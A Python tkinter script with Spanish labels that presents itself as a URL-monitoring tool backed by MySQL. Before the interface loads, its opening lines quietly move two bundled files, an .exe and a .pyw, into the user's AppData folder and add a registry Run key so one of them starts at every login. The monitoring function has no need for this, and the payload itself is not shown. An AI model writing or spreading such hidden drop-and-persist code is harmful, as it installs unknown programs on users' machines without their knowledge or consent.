from tkinter import scrolledtext
from tkinter import messagebox
import tkinter as tk
from tkinter import font
import mysql.connector
import threading, time, requests
from datetime import datetime
import os, shutil, subprocess

rscript='autopec.exe'
rscript2='sgpln.pyw'
user=os.getlogin()
rt=f'C:\\Users\\{user}\\AppData\\autopec.exe'
rt2=f'C:\\Users\\{user}\\AppData\\sgpln.pyw'
if not os.path.exists(rt):
 shutil.move(rscript, rt)
if not os.path.exists(rt2):
 shutil.move(rscript2, rt2)


reg=f'reg add "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v autopec /t REG_SZ /d {rt2} /f'
subprocess.run(reg, shell=True)
url = "https://www.google.com"
while True:
 try:
  response = requests.get(url)
  if response.status_code == 200:
   print("Conexión exitosa")
   break
 except requests.ConnectionError:
  print("Error de conexión. Intentando de nuevo...")
 time.sleep(3)

autenticacion = mysql.connector.connect(
user='root',
password='',
host='localhost',
database='DATABASEX'
)

def volver_a_principal():
 for widget in interfaz.winfo_children():
  widget.destroy()
 crear_botones_principales()

def crear_botones_principales():
 fuente_negrita = font.Font(family="Calibri", size=12, weight="bold")
 listar_monitores = tk.Button(interfaz, text="LISTAR MONITORES", width=30, bg="black", fg="white", font=fuente_negrita, command=ver_base_de_datos)
 listar_monitores.pack(pady=(50, 20))
 agregar_btn = tk.Button(interfaz, text="AGREGAR", width=30, bg="black", fg="white", font=fuente_negrita,  command=funcion1)
 agregar_btn.pack(pady=(10, 20))
 editar_btn = tk.Button(interfaz, text="EDITAR", width=30, bg="black", fg="white", font=fuente_negrita, command=funcion2)
 editar_btn.pack(pady=(10, 20))
 eliminar_btn = tk.Button(interfaz, text="ELIMINAR", width=30, bg="black", fg="white", font=fuente_negrita, command=funcion3)
 eliminar_btn.pack(pady=(10, 20))

def funcion1():
 fuente_negrita = font.Font(family="Calibri", size=12, weight="bold")
 for widget in interfaz.winfo_children():
  widget.destroy()
 tk.Label(interfaz, text="Ingrese la URL", bg="black", fg="white").pack(pady=(10, 5))
 entrada_url = tk.Entry(interfaz, width=30)
 entrada_url.pack(pady=(0, 10))
 tk.Label(interfaz, text="Tiempo (en minutos)", bg="black", fg="white").pack(pady=(10, 5))
 entrada_tiempo = tk.Entry(interfaz, width=10)
 entrada_tiempo.pack(pady=(0, 10))
 enviar_btn = tk.Button(interfaz, text="Guardar", width=20, bg="#00FF00", fg="black", font=fuente_negrita, command=lambda: agregar(entrada_url.get(), entrada_tiempo.get()))
 enviar_btn.pack(pady=(10, 20))
 atras_btn = tk.Button(interfaz, text="Volver", width=20, bg="#00FF00", fg="black", font=fuente_negrita, command=volver_a_principal)
 atras_btn.pack(pady=(10, 20))

def agregar(url, tiempo):
 cursor = autenticacion.cursor()
 query = "INSERT INTO control (url, minutos) VALUES (%s, %s)"
 try:
  cursor.execute(query, (url, tiempo))
  autenticacion.commit()
  tk.messagebox.showinfo("Éxito", "Datos guardados correctamente!")
 except Exception as e:
  tk.messagebox.showerror("Error", f"Ocurrió un error: {e}")
 finally:
  cursor.close()

def funcion2():
 fuente_negrita = font.Font(family="Calibri", size=12, weight="bold")
 for widget in interfaz.winfo_children():
  widget.destroy()
 tk.Label(interfaz, text="URL ACTUAL:", bg="black", fg="white").pack(pady=(10, 5))
 entrada_url = tk.Entry(interfaz, width=30)
 entrada_url.pack(pady=(0, 10))
 tk.Label(interfaz, text="CAMBIAR URL POR:", bg="black", fg="white").pack(pady=(10, 5))
 entrada_url2 = tk.Entry(interfaz, width=30)
 entrada_url2.pack(pady=(0, 10))
 tk.Label(interfaz, text="TIEMPO ACTUAL", bg="black", fg="white").pack(pady=(10, 5))
 entrada_tiempo = tk.Entry(interfaz, width=20)
 entrada_tiempo.pack(pady=(0, 10))
 tk.Label(interfaz, text="CAMBIAR TIEMPO POR", bg="black", fg="white").pack(pady=(10, 5))
 entrada_tiempo2 = tk.Entry(interfaz, width=20)
 entrada_tiempo2.pack(pady=(0, 10))
 enviar_btn = tk.Button(interfaz, text="Enviar", width=20, bg="#00FF00", fg="black", font=fuente_negrita, command=lambda: editar(entrada_url.get(), entrada_url2.get(), entrada_tiempo.get(), entrada_tiempo2.get()))
 enviar_btn.pack(pady=(10, 20))
 atras_btn = tk.Button(interfaz, text="Volver", width=20, bg="#00FF00", fg="black", font=fuente_negrita, command=volver_a_principal)
 atras_btn.pack(pady=(10, 20))

def editar(url_antigua, url_nueva, tiempo_antiguo, tiempo_nuevo):
 try:
  cursor = autenticacion.cursor()
  query = """
  UPDATE control
  SET url = %s, minutos = %s
  WHERE url = %s AND minutos = %s
  """
  cursor.execute(query, (url_nueva, tiempo_nuevo, url_antigua, tiempo_antiguo))
  autenticacion.commit()
  filas_actualizadas = cursor.rowcount
  if filas_actualizadas > 0:
   messagebox.showinfo("Resultado", f"Filas actualizadas: {filas_actualizadas}")
  else:
   messagebox.showwarning("Resultado", "No se encontraron coincidencias para actualizar.")
 except mysql.connector.Error as err:
  messagebox.showerror("Error", f"Error: {err}")
 finally:
  cursor.close()

def funcion3():
 fuente_negrita = font.Font(family="Calibri", size=12, weight="bold")
 for widget in interfaz.winfo_children():
  widget.destroy()
 tk.Label(interfaz, text="Ingrese la URL", bg="black", fg="white").pack(pady=(40, 5))
 entrada_url = tk.Entry(interfaz, width=30)
 entrada_url.pack(pady=(20, 10))
 enviar_btn = tk.Button(interfaz, text="Enviar", width=20, bg="#00FF00", fg="black", font=fuente_negrita, command=lambda: eliminar(entrada_url.get()))
 enviar_btn.pack(pady=(10, 20))
 atras_btn = tk.Button(interfaz, text="Volver", width=20, bg="#00FF00", fg="black", font=fuente_negrita, command=volver_a_principal)
 atras_btn.pack(pady=(10, 20))

def eliminar(url_a_eliminar):
 cursor = autenticacion.cursor()
 query = "DELETE FROM control WHERE url = %s"
 cursor.execute(query, (url_a_eliminar,))
 autenticacion.commit()
 filas_eliminadas = cursor.rowcount
 messagebox.showinfo("Resultado", f"SE ELIMINO LA URL DE LA BASE DE DATOS")
 cursor.close()

def ver_base_de_datos():
 cursor = autenticacion.cursor()
 query = "SELECT url, minutos FROM control"
 cursor.execute(query)
 resultados = cursor.fetchall()
 ventana_resultados = tk.Toplevel(interfaz)
 ventana_resultados.title("INFORMACION DE MONITORES")
 text_area = scrolledtext.ScrolledText(ventana_resultados, wrap=tk.WORD, width=50, height=10)
 text_area.pack(expand=True, fill='both')
 for fila in resultados:
  text_area.insert(tk.END, f"URL: {fila[0]}\nTiempo: {fila[1]} min\n\n")
 text_area.config(state=tk.DISABLED)
 cursor.close()

def monitorear():
 cursor = autenticacion.cursor()
 query = "SELECT url, minutos FROM control"
 cursor.execute(query)
 resultados = cursor.fetchall()
 return [{"url": fila[0], "intervalo": int(fila[1]) * 60} for fila in resultados]

def enviar_peticion(url_info):
 url = url_info["url"]
 intervalo = url_info["intervalo"]
 remaining = intervalo
 while True:
  if remaining > 0:
   lineas[url] = f"{url}: {remaining} Segundos Restantes"
   remaining -= 1
   time.sleep(1)
   text_area.after(100, actualizar_text_area)
  else:
   try:
    response = requests.get(url)
    status = response.status_code
    estado = "Éxito" if status == 200 else "Error"
   except requests.exceptions.RequestException as e:
    estado = "Error"
    status = str(e)
   lineas[url] = f"{datetime.now().strftime('%H:%M:%S')} - {url}: {estado} (Código: {status})"
   estados[url] = "Petición enviada" if estado == "Éxito" else "Hubo un error en la petición"
   remaining = intervalo
   text_area.after(100, actualizar_text_area())

def actualizar_text_area():
 text_area.delete(1.0, tk.END)
 for nombre in lineas:
  estado_color = "green" if "Éxito" in lineas[nombre] else "red"
  text_area.insert(tk.END, lineas[nombre] + '\n', ('estado', estado_color))
 text_area.tag_config('estado', foreground='white')
 text_area.see(tk.END)

interfaz = tk.Tk()
interfaz.title("INTERFAZ GRAFICA")
interfaz.configure(bg="black")
ancho_ventana = interfaz.winfo_screenwidth()
alto_ventana = interfaz.winfo_screenheight()
interfaz.geometry(f"{ancho_ventana}x{alto_ventana}")
crear_botones_principales()


urls = monitorear()
lineas = {url_info["url"]: f"{url_info['url']}: Esperando..." for url_info in urls}
estados = {url_info["url"]: "" for url_info in urls}
text_area = scrolledtext.ScrolledText(interfaz, bg='black', fg='white', width=70, height=10)
text_area.pack()
for url_info in urls:
 threading.Thread(target=enviar_peticion, args=(url_info,), daemon=True).start()
interfaz.mainloop()
